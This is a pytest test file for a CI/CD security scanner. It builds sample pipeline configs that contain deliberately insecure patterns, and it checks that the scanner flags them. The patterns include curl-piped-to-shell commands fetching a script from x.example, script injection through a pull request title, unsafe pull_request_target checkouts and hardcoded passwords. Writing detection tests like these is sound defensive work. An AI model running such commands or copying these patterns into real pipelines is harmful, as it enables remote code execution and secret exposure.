"""Tests for the CI/CD pipeline scanner (GitHub Actions, GitLab, Azure,
Jenkins, CircleCI) and the misc CI rules."""
from __future__ import annotations

import textwrap
from pathlib import Path

import pytest

from hiddenshadow import ci_pipelines as cip
from hiddenshadow import ci_misc
from hiddenshadow.ci_pipelines import github_actions as gha


def _write_wf(tmp_path: Path, body: str, name: str = "ci.yml") -> Path:
    d = tmp_path / ".github" / "workflows"
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_text(textwrap.dedent(body).strip() + "\n")
    return p


def _rules(findings) -> set[str]:
    """Extract rule IDs from a list of CiFinding or Finding."""
    out = set()
    for f in findings:
        if hasattr(f, "rule_id"):
            out.add(f.rule_id)
        else:
            method = getattr(f, "method", "") or ""
            if ":" in method:
                out.add(method.rsplit(":", 1)[-1])
    return out


# ── GitHub Actions: action pinning ─────────────────────────────────────

def test_gha_mutable_major_tag_flagged(tmp_path: Path):
    _write_wf(tmp_path, """
        name: CI
        on: push
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - uses: actions/checkout@v4
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-action-not-pinned" in rules


def test_gha_sha_pinned_no_finding(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - uses: actions/checkout@a12345678901234567890123456789012345abcd
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-action-not-pinned" not in rules


def test_gha_concrete_tag_is_low(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - uses: actions/checkout@v4.1.2
    """)
    fs = cip.scan_path(tmp_path, repo_name="t")
    pin_findings = [f for f in fs if f.rule_id == "gha-action-pin-to-tag"]
    assert pin_findings
    assert pin_findings[0].severity == "low"


def test_gha_branch_ref_high(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - uses: actions/checkout@main
    """)
    fs = cip.scan_path(tmp_path, repo_name="t")
    assert any(f.rule_id == "gha-action-not-pinned" and f.severity == "high"
               for f in fs)


def test_gha_local_action_not_flagged(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - uses: ./.github/actions/local
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-action-not-pinned" not in rules


# ── GitHub Actions: pull_request_target ────────────────────────────────

def test_gha_pr_target_with_checkout_head_critical(tmp_path: Path):
    _write_wf(tmp_path, """
        on: pull_request_target
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - uses: actions/checkout@a12345678901234567890123456789012345abcd
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
    """)
    fs = cip.scan_path(tmp_path, repo_name="t")
    hit = next((f for f in fs
                if f.rule_id == "gha-pr-target-checkout-head"), None)
    assert hit is not None
    assert hit.severity == "critical"


def test_gha_pr_target_without_head_checkout_no_finding(tmp_path: Path):
    _write_wf(tmp_path, """
        on: pull_request_target
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - uses: actions/checkout@a12345678901234567890123456789012345abcd
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-pr-target-checkout-head" not in rules


# ── GitHub Actions: permissions ────────────────────────────────────────

def test_gha_no_permissions_flagged(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - run: echo hi
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-no-permissions" in rules


def test_gha_permissions_write_all_high(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        permissions: write-all
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - run: echo hi
    """)
    fs = cip.scan_path(tmp_path, repo_name="t")
    hit = next((f for f in fs if f.rule_id == "gha-permissions-write-all"),
               None)
    assert hit is not None
    assert hit.severity == "high"


def test_gha_per_job_permissions_satisfies(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo hi
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-no-permissions" not in rules


# ── GitHub Actions: script injection in run: ──────────────────────────

def test_gha_script_injection_pr_title_critical(tmp_path: Path):
    _write_wf(tmp_path, """
        on: pull_request
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - run: |
                  echo "PR: ${{ github.event.pull_request.title }}"
    """)
    fs = cip.scan_path(tmp_path, repo_name="t")
    hit = next((f for f in fs if f.rule_id == "gha-script-injection"), None)
    assert hit is not None
    assert hit.severity == "critical"


def test_gha_env_var_avoidance_no_finding(tmp_path: Path):
    # Same value as above but read via env: → safe pattern.
    _write_wf(tmp_path, """
        on: pull_request
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - env:
                  PR_TITLE: ${{ github.event.pull_request.title }}
                run: echo "$PR_TITLE"
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-script-injection" not in rules


def test_gha_curl_pipe_sh_critical(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - run: curl -sL https://x.example/i.sh | sh
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-run-curl-pipe-sh" in rules


# ── GitHub Actions: secrets to third party ────────────────────────────

def test_gha_secrets_to_third_party_high(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            timeout-minutes: 5
            steps:
              - uses: some-vendor/composite-action@a12345678901234567890123456789012345abcd
                with:
                  API_KEY: ${{ secrets.VENDOR_API_KEY }}
    """)
    fs = cip.scan_path(tmp_path, repo_name="t")
    hit = next((f for f in fs if f.rule_id == "gha-secrets-to-third-party"),
               None)
    assert hit is not None


# ── GitHub Actions: timeouts ──────────────────────────────────────────

def test_gha_missing_timeout(tmp_path: Path):
    _write_wf(tmp_path, """
        on: push
        permissions: { contents: read }
        jobs:
          x:
            runs-on: ubuntu-latest
            steps:
              - run: echo hi
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-no-timeout" in rules


# ── GitHub Actions: self-hosted runner ────────────────────────────────

def test_gha_self_hosted_flagged(tmp_path: Path):
    _write_wf(tmp_path, """
        on: pull_request
        permissions: { contents: read }
        jobs:
          x:
            runs-on: [self-hosted, linux]
            timeout-minutes: 5
            steps:
              - run: echo hi
    """)
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gha-self-hosted-public" in rules


# ── GitLab CI ──────────────────────────────────────────────────────────

def test_gitlab_privileged_dind_flagged(tmp_path: Path):
    (tmp_path / ".gitlab-ci.yml").write_text(textwrap.dedent("""
        build:
          image: docker:24
          services:
            - docker:24-dind
          script:
            - docker build -t x .
    """))
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gl-privileged-dind" in rules


def test_gitlab_secret_literal_in_variables(tmp_path: Path):
    (tmp_path / ".gitlab-ci.yml").write_text(textwrap.dedent("""
        deploy:
          script:
            - ./deploy.sh
          variables:
            DATABASE_PASSWORD: "hunter2-production"
    """))
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gl-secret-literal" in rules


def test_gitlab_image_latest(tmp_path: Path):
    (tmp_path / ".gitlab-ci.yml").write_text(textwrap.dedent("""
        image: node:latest
        build:
          script: npm run build
    """))
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "gl-image-latest" in rules


# ── Azure Pipelines ────────────────────────────────────────────────────

def test_azure_mutable_task_version(tmp_path: Path):
    (tmp_path / "azure-pipelines.yml").write_text(textwrap.dedent("""
        steps:
          - task: PowerShell@*
            inputs:
              script: echo hi
    """))
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "az-task-mutable-version" in rules


def test_azure_ext_template_no_ref(tmp_path: Path):
    (tmp_path / "azure-pipelines.yml").write_text(textwrap.dedent("""
        resources:
          repositories:
            - repository: shared
              type: github
              name: org/shared-templates
        steps:
          - script: echo hi
    """))
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "az-ext-template-no-ref" in rules


# ── Jenkins ────────────────────────────────────────────────────────────

def test_jenkins_sh_interpolated_flagged(tmp_path: Path):
    (tmp_path / "Jenkinsfile").write_text(textwrap.dedent("""
        pipeline {
          agent any
          stages {
            stage('build') {
              steps {
                sh "echo ${env.BRANCH_NAME}"
              }
            }
          }
        }
    """))
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "jk-sh-interpolated" in rules


def test_jenkins_curl_pipe_sh(tmp_path: Path):
    (tmp_path / "Jenkinsfile").write_text(textwrap.dedent("""
        pipeline {
          agent any
          stages { stage('build') { steps {
            sh '''curl -sL https://x.example/i.sh | bash'''
          }}}
        }
    """))
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "jk-curl-pipe-sh" in rules


# ── CircleCI ───────────────────────────────────────────────────────────

def test_circle_mutable_orb(tmp_path: Path):
    d = tmp_path / ".circleci"
    d.mkdir()
    (d / "config.yml").write_text(textwrap.dedent("""
        version: 2.1
        orbs:
          slack: circleci/slack@volatile
        jobs:
          build:
            docker:
              - image: cimg/node:18.16
            steps:
              - checkout
    """))
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "cc-orb-mutable" in rules


def test_circle_image_latest(tmp_path: Path):
    d = tmp_path / ".circleci"
    d.mkdir()
    (d / "config.yml").write_text(textwrap.dedent("""
        version: 2.1
        orbs:
          slack: circleci/slack@4.12.1
        jobs:
          build:
            docker:
              - image: node:latest
            steps:
              - checkout
    """))
    rules = _rules(cip.scan_path(tmp_path, repo_name="t"))
    assert "cc-image-latest" in rules


# ── Misc CI rules ──────────────────────────────────────────────────────

def test_precommit_no_rev(tmp_path: Path):
    (tmp_path / ".pre-commit-config.yaml").write_text(textwrap.dedent("""
        repos:
          - repo: https://github.com/psf/black
    """))
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "precommit-no-rev" in rules


def test_precommit_branch_rev(tmp_path: Path):
    (tmp_path / ".pre-commit-config.yaml").write_text(textwrap.dedent("""
        repos:
          - repo: https://github.com/psf/black
            rev: main
    """))
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "precommit-rev-branch" in rules


def test_precommit_pinned_no_finding(tmp_path: Path):
    (tmp_path / ".pre-commit-config.yaml").write_text(textwrap.dedent("""
        repos:
          - repo: https://github.com/psf/black
            rev: 24.1.0
    """))
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "precommit-no-rev" not in rules
    assert "precommit-rev-branch" not in rules


def test_codeowners_empty(tmp_path: Path):
    (tmp_path / "CODEOWNERS").write_text("# only comments\n")
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "codeowners-empty" in rules


def test_codeowners_no_default(tmp_path: Path):
    (tmp_path / "CODEOWNERS").write_text("docs/* @team-docs\n")
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "codeowners-no-default" in rules


def test_codeowners_good_no_finding(tmp_path: Path):
    (tmp_path / "CODEOWNERS").write_text("* @org/security\n")
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "codeowners-empty" not in rules
    assert "codeowners-no-default" not in rules


def test_renovate_automerge_major(tmp_path: Path):
    (tmp_path / "renovate.json").write_text(
        '{ "automerge": true, '
        '"packageRules": [{"matchUpdateTypes": ["major", "minor"]}] }'
    )
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "renovate-automerge-major" in rules


def test_dependabot_loose_limit(tmp_path: Path):
    d = tmp_path / ".github"
    d.mkdir()
    (d / "dependabot.yml").write_text(textwrap.dedent("""
        version: 2
        updates:
          - package-ecosystem: npm
            directory: "/"
            schedule: { interval: daily }
            open-pull-requests-limit: 50
    """))
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "dependabot-loose-limit" in rules


def test_env_file_committed(tmp_path: Path):
    (tmp_path / ".env").write_text("DATABASE_PASSWORD=hunter2\n")
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "env-file-committed" in rules


def test_env_example_not_flagged(tmp_path: Path):
    (tmp_path / ".env.example").write_text("DATABASE_PASSWORD=changeme\n")
    rules = _rules(ci_misc.scan_path(tmp_path, repo="t"))
    assert "env-file-committed" not in rules
